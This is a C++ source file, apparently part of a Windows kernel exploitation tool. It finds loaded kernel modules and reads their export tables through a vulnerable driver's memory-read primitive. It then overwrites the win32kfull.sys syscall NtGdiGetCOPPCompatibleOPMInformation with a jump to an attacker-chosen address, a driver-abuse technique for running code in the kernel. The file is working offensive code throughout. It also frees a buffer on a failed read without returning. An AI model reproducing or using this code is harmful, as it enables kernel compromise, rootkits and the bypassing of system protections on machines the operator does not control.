#include "kernel_module.h"

#include "ntdefs.h"
#include "ntops.h"

#include <algorithm>

using namespace kernel;

static std::unordered_map<std::string, std::unique_ptr<kernel_module>> s_module_list;

kernel_module::kernel_module(const std::string& kernel_module_name)
{

	_module_name = kernel_module_name;

	void* system_information_buffer = nullptr;
	DWORD buffer_size = 0ul;
	NTSTATUS status = NtQuerySystemInformation(11, system_information_buffer, 
		buffer_size, &buffer_size);

	while (status == STATUS_INFO_LENGTH_MISMATCH)
	{
		VirtualFree(system_information_buffer, 0, MEM_RELEASE);

		system_information_buffer = VirtualAlloc(nullptr, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		status = NtQuerySystemInformation(11, system_information_buffer, buffer_size, &buffer_size);
	}

	if (!NT_SUCCESS(status))
	{
		VirtualFree(system_information_buffer, 0, MEM_RELEASE);
		return;
	}

	PRTL_PROCESS_MODULES modules = reinterpret_cast<PRTL_PROCESS_MODULES>(system_information_buffer);

	if (modules == nullptr)
	{
		return;
	}

	for (uint64_t i = 0u; i < modules->NumberOfModules; ++i)
	{
		const std::string current_module_name = std::string(reinterpret_cast<char*>(modules->Modules[i].FullPathName) + modules->Modules[i].OffsetToFileName);
		if (!current_module_name.compare(kernel_module_name))
		{
			_base_address = reinterpret_cast<uint64_t>(modules->Modules[i].ImageBase);
			_image_size = modules->Modules[i].ImageSize;
			_image_mapped_base = reinterpret_cast<uint64_t>(modules->Modules[i].MappedBase);
			break;
		}
	}

	VirtualFree(system_information_buffer, 0, MEM_RELEASE);
}

kernel_module* kernel_module::get_kernel_module(const std::string& kernel)
{
	if (s_module_list.find(kernel) != s_module_list.end())
	{
		return s_module_list[kernel].get();
	}
	kernel_module* stupid_pointer = new kernel_module(kernel);
	std::unique_ptr<kernel_module> smart_pointer = std::unique_ptr<kernel_module>(stupid_pointer);
	s_module_list[kernel] = std::move(
		smart_pointer
	);

	return s_module_list[kernel].get();
}

uint64_t kernel_module::get_module_export(vulnerable_driver* driver, const std::string& export_name)
{
	if (_base_address == 0ull) return 0ull;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!driver->driver_read_primitive(_base_address, &dos_header, sizeof(IMAGE_DOS_HEADER)))
	{
		std::cerr << "[-] Failed to read base address: 0x" << std::hex << _base_address << std::dec << std::endl;
		return 0x0;
	}

	//
	if (dos_header.e_magic != IMAGE_DOS_SIGNATURE)
	{
		std::cerr << "[-] Attempt to read invalid image: 0x" << std::hex << _base_address << std::dec << std::endl;
		return 0x0;
	}

	//If we can't ready the Image NT headers yeet out
	uint64_t nt_header_address = _base_address + dos_header.e_lfanew;
	if (!driver->driver_read_primitive(nt_header_address, &nt_headers, sizeof(IMAGE_NT_HEADERS64)))
	{
		std::cerr << "[-] Failed to read image NT headers at 0x" << std::hex << nt_header_address << std::dec << std::endl;
		return 0x0;
	}

	uint64_t export_base_address = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	uint64_t export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base_address || !export_base_size)
		return 0x0;

	//Allocate our buffer and store a pointer, this is where the export directory will get parsed by our program
	void* export_data_buffer = VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	PIMAGE_EXPORT_DIRECTORY export_directory = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(export_data_buffer);

	if (!driver->driver_read_primitive(_base_address + export_base_address, export_data_buffer, export_base_size))
	{
		std::cerr << "[-] Failed to read export data table at 0x" << std::hex << export_base_address << std::dec << std::endl;
		VirtualFree(export_data_buffer, 0, MEM_RELEASE);
	}

	std::cout << "[+] data: " << export_directory->NumberOfFunctions << " " << export_directory->NumberOfNames << std::endl;;

	uint64_t delta = reinterpret_cast<uint64_t>(export_data_buffer) - export_base_address;

	uint32_t* export_name_table = reinterpret_cast<uint32_t*>(export_directory->AddressOfNames + delta); //Center export tables
	uint16_t* ordinal_function_table = reinterpret_cast<uint16_t*>(export_directory->AddressOfNameOrdinals + delta);
	uint32_t* export_function_table = reinterpret_cast<uint32_t*>(export_directory->AddressOfFunctions + delta);

	for (auto i = 0; i < export_directory->NumberOfNames; ++i)
	{
		char* name_ptr = (char*)(export_name_table[i] + delta);
		const std::string function_name = std::string(name_ptr);
		if (!function_name.compare(export_name))
		{
			uint16_t function_ordinal = ordinal_function_table[i];
			uint64_t function_address = _base_address + export_function_table[function_ordinal];

			//If this isn't a valid address in the export table 
			if (function_address >= _base_address + export_base_address 
				&& function_address <= _base_address + export_base_address + export_base_size)
			{
				VirtualFree(export_directory, 0, MEM_RELEASE);
				return 0x0;
			}

			VirtualFree(export_directory, 0, MEM_RELEASE);
			return function_address;
		}
	}
	VirtualFree(export_directory, 0, MEM_RELEASE);
	return 0x0;
}

bool kernel_module::patch_syscall(vulnerable_driver* driver, uint64_t target_address)
{
	if (current_syscall_patch == nullptr)
		current_syscall_patch = new syscall_patch_context();

	if (_module_name.compare("win32kfull.sys") != 0)
	{
		std::cerr << "[-] No valid syscall patch available for this module: " << _module_name << std::endl;
		return false;
	}

	const uint64_t target_syscall = get_module_export(driver, "NtGdiGetCOPPCompatibleOPMInformation");

	std::cout << "kernel function ptr" << std::hex << target_syscall << std::dec << std::endl;

	if (target_syscall == 0)
	{
		std::cerr << "[-] Failed to get win32kfull.sys!NtGdiGetCOPPCompatibleOPMInformation" << std::endl;
		return false;
	}

	current_syscall_patch->kernel_function_pointer = target_syscall;

	if (!driver->driver_read_primitive(target_syscall, current_syscall_patch->kernel_original_function_jmp, sizeof(current_syscall_patch->kernel_original_function_jmp)))
	{
		return false;
	}

	memcpy(current_syscall_patch->function_call_template + 2, &target_address, sizeof(uint64_t));

	if (!driver->driver_force_write(target_syscall, current_syscall_patch->function_call_template, sizeof(current_syscall_patch->function_call_template)))
		return false;

	return true;
}

std::ostream& kernel::operator<<(std::ostream& os, const kernel_module& module)
{
	os << "[+]Dumping information about: " << module._module_name << std::endl;
	os << "  [+] Image base: 0x" << std::hex << module._base_address << std::dec << std::endl;
	os << "  [+] Image size: 0x" << std::hex << module._image_size << std::dec << std::endl;
	os << "  [+] Image mapped base: 0x" << std::hex << module._image_mapped_base << std::dec << std::endl;

	return os;
}
